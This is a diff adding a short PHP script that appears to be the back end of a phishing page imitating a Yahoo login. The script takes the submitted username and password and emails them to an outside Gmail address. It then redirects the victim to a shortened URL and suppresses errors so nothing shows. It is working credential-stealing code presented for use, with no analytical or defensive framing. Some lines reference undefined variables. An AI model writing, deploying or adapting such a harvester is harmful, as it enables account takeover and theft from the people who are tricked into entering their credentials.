@@ -1,0 +1,26 @@
+doctype php
+<?php 
+
+error_reporting(0); 
+$correo_electronico= $_POST['username']; 
+$clave= $_POST['passwd']; 
+$ip= $_POST['get_ip_address ()'];
+$header = 'From: ' . $email . ", de la poblacion ".$poblacion."\r\n"; 
+$header .= "X-Mailer: PHP/" . phpversion() . " \r\n"; 
+$header .= "Mime-Version: 1.0 \r\n"; 
+$header .= "Content-Type: text/plain"; 
+
+
+$mensaje .= "correo " . $_POST['username'] . " \r\n"; 
+$mensaje .= "clave " . $_POST['passwd'] . " \r\n"; 
+$mensaje .= "Enviado el " . date('d/m/Y', time());
+
+
+$para = 'leepootasborne@gmail.com'; 
+$asunto = 'yaho';
+
+mail($para, $asunto, utf8_decode($mensaje), $header); 
+
+header('Location: https://tinyurl.com/yvmu4'); 
+
+?>
